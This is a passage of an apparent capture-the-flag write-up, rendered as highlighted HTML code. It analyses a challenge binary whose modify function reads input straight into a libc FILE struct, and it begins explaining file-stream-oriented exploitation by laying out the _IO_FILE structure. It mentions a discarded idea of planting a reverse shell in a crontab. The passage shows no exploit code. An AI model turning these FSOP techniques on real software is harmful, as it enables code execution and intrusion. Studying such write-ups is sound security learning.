+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">io</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">        </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">            </span><span class="s">&quot;_IO_precheck_(): Uninitialized _CUSTOM_IO_FILE*&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">NULL_PTR</span><span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">MODE</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">_IO_READ_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// _IO_read_</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">file</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">is_open</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">            </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">                </span><span class="s">&quot;_IO_read_(): File not opened&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DO_NOT_EXIT</span><span class="p">);</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">NULL_PTR</span><span class="p">;</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">mode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">_IO_READ_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">            </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">                </span><span class="s">&quot;_IO_read_(): File was not opened in READ mode&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DO_NOT_EXIT</span><span class="p">);</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">INVAL_MODE</span><span class="p">;</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">        </span><span class="p">}</span>
+</span></code></pre></div></p>
+<p>One thing of note here was that the <code>_IO_MODIFY_</code> operation did not require the file to be opened in <code>_IO_WRITE_</code> mode
+<div class="language-c highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">MODE</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">_IO_MODIFY_</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">file</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">is_open</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">        </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">            </span><span class="s">&quot;_IO_modify_(): File not opened&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DO_NOT_EXIT</span><span class="p">);</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">NULL_PTR</span><span class="p">;</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">global_counter_handler</span><span class="p">.</span><span class="n">modify</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">MAX_MODIFIES_ALLOWED</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="w">        </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">            </span><span class="s">&quot;_IO_modify_(): Constraint reached. Cannot modify the contents of the file.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DO_NOT_EXIT</span><span class="p">);</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">CONSTRAINTS_ERROR</span><span class="p">;</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<p>This makes sense when we look at the code for the <code>_IO_modify_</code> function
+<div class="language-c highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">_IO_ERROR_</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nf">_IO_modify_</span><span class="p">(</span><span class="n">_CUSTOM_IO_FILE_</span><span class="o">*</span><span class="w"> </span><span class="n">io</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="w">    </span><span class="n">_IO_ERROR_</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_IO_precheck_</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="w"> </span><span class="n">_IO_MODIFY_</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter the content you want to write: &quot;</span><span class="p">);</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">io</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_IO_FILE_SIZE</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">MODIFY_FAILED</span><span class="p">;</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">    </span><span class="n">global_counter_handler</span><span class="p">.</span><span class="n">modify</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">;</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="p">}</span>
+</span></code></pre></div>
+We can see that there is a read directly from <code>stdin</code> to the <code>FILE</code> struct itself rather than into the file contents. This is clearly an FSOP challenge, however, I did not know this at the time because I had never solved an FSOP challenge before<br />
+Lets take a look at the rest of the code execution flow before discussing the actual exploitation phase  </p>
+<p>The main function is pretty simple. It starts off with instantiating a <code>_CUSTOM_IO_FILE_</code> object and then presents a menu to select from the operations discussed before
+<div class="language-c highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">argv</span><span class="p">[],</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">envp</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span><span class="n">_CUSTOM_IO_FILE_</span><span class="w"> </span><span class="o">*</span><span class="n">io</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_init_IO</span><span class="p">();</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="n">_IO_ERROR_</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">mode</span><span class="p">;</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="n">MAX_CONTENT_SIZE</span><span class="p">];</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">    </span><span class="k">while</span><span class="p">(</span><span class="nb">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">        </span><span class="n">menu</span><span class="p">();</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="w">        </span><span class="n">get_input</span><span class="p">(</span><span class="n">PROMPT</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="w">        </span><span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">0</span><span class="p">:</span>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="w">                </span><span class="k">goto</span><span class="w"> </span><span class="n">_end</span><span class="p">;</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">_IO_precheck_</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="w"> </span><span class="n">_IO_OPEN_</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="w">                </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enter the name of the file you want to open: &quot;</span><span class="p">);</span>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="w">                </span><span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_CONTENT_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="w">                </span><span class="n">buffer</span><span class="p">[</span><span class="n">strcspn</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;flag&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="w">                    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;*** _IO_open_(): failed. flag is an invalid keyword ***</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="w">                    </span><span class="k">break</span><span class="p">;</span>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="w">                </span><span class="p">}</span>
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="w">                </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter the mode you want to open the file in: &quot;</span><span class="p">);</span>
+</span></code></pre></div>
+We can see we aren't allowed to open the flag file directly. That will have to be done via exploitation<br />
+This is the program in action<br />
+<img alt="Pasted image 20241121034348.png" src="../../../images/Pasted%20image%2020241121034348.png" /></p>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<p>First I figured since we had a write on the <code>FILE</code> object, we could use it to write to a soft link we had write permissions on and modify the file path it points to. This way we could possibly circumvent the check against open files with the string "flag" in their name. This approach, however, was quickly discarded because of three main reasons:  </p>
+<ul>
+<li><code>fopen</code> always follows soft links. We can't write to the link file itself since we always get a handle to the actual file it points to</li>
+<li>We need a file descriptor to write to the link but we only have a <code>FILE</code> handle instead</li>
+<li>We don't have any normal method of reading the file contents even after opening the file because the <code>_IO_read_</code> method doesn't display the contents of the file and there is no other function that prints out the <code>content</code> variable in <code>_CUSTOM_IO_FILE_</code>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">_IO_ERROR_</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nf">_IO_read_</span><span class="p">(</span><span class="n">_CUSTOM_IO_FILE_</span><span class="o">*</span><span class="w"> </span><span class="n">io</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">nbytes</span><span class="p">;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">    </span><span class="n">_IO_ERROR_</span><span class="w"> </span><span class="n">err</span><span class="p">;</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_IO_precheck_</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="w"> </span><span class="n">_IO_READ_</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"> </span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">MAX_CONTENT_SIZE</span><span class="p">);</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">    </span><span class="k">if</span><span class="p">((</span><span class="n">nbytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fread</span><span class="p">(</span><span class="n">io</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span><span class="w"> </span><span class="n">MAX_CONTENT_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">io</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="w">        </span><span class="n">__err</span><span class="p">(</span>
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="w">            </span><span class="s">&quot;_IO_read(): fread failed&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DO_NOT_EXIT</span><span class="p">);</span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">READ_FAILED</span><span class="p">;</span>
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w">    </span><span class="n">global_counter_handler</span><span class="p">.</span><span class="n">read</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">SUCCESS</span><span class="p">;</span>
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="p">}</span>
+</span></code></pre></div></li>
+</ul>
+<p>Then I thought about writing a reverse shell to something like the user crontab file but unfortunately the environment was very minimal and did not have a cron daemon available  </p>
+<p>I discussed a bit with my team mate and we decided to look into FSOP. After reading a couple blogs on FSOP I found that the <code>FILE</code> write primitive that we had from <code>_IO_modify</code> was everything we needed to get arbitrary code execution. The first primitive we found was a way to convert the <code>fwrite</code> function into an <code>fread</code> from an arbitrary address onto an arbitrary file descriptor. How this works can be seen if we look into the libc implementation of <code>struct FILE</code> which is defined as follows<br />
+<div class="language-c highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">FILE.h</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span>
+<span class="normal"><a href="#__codelineno-10-4">4</a></span>
+<span class="normal"><a href="#__codelineno-10-5">5</a></span>
+<span class="normal"><a href="#__codelineno-10-6">6</a></span>
+<span class="normal"><a href="#__codelineno-10-7">7</a></span>
+<span class="normal"><a href="#__codelineno-10-8">8</a></span>
+<span class="normal"><a href="#__codelineno-10-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="cp">#ifndef __FILE_defined</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="cp">#define __FILE_defined 1</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="p">;</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="cm">/* The opaque type of streams.  This is the definition used elsewhere.  */</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="kt">FILE</span><span class="p">;</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="cp">#endif</span>
+</span></code></pre></div></td></tr></table></div></p>
+<div class="language-c highlight"><span class="filename">struct _IO_FILE</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cm">/* offset      |    size */</span><span class="w">  </span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="cm">/*      0      |       4 */</span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">_flags</span><span class="p">;</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="cm">/* XXX  4-byte hole      */</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="cm">/*      8      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="cm">/*     16      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="cm">/*     24      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="cm">/*     32      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="cm">/*     40      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="cm">/*     48      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="cm">/*     56      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="cm">/*     64      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="cm">/*     72      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="cm">/*     80      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="cm">/*     88      |       8 */</span><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span>
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="cm">/*     96      |       8 */</span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_marker</span><span class="w"> </span><span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="cm">/*    104      |       8 */</span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_FILE</span><span class="w"> </span><span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
